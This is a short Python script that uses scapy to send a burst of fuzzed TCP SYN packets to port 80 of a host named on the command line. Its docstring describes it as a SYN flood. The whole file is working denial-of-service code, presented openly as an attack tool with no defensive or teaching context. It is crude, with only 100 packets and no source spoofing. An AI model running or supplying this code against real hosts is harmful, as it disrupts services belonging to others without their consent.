#!/usr/bin/env python

import argparse
from scapy.all import *

def main():
    '''
        Build a SYN flood against a host using scapy
    '''

    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="The destination host IE 192.168.1.1")

    args = parser.parse_args()

    for i in range (0, 100):
        message = ( (IP(dst=args.host)) / fuzz(TCP(dport=80,flags='S')) )
        send(message)

if __name__ == "__main__":
    main()
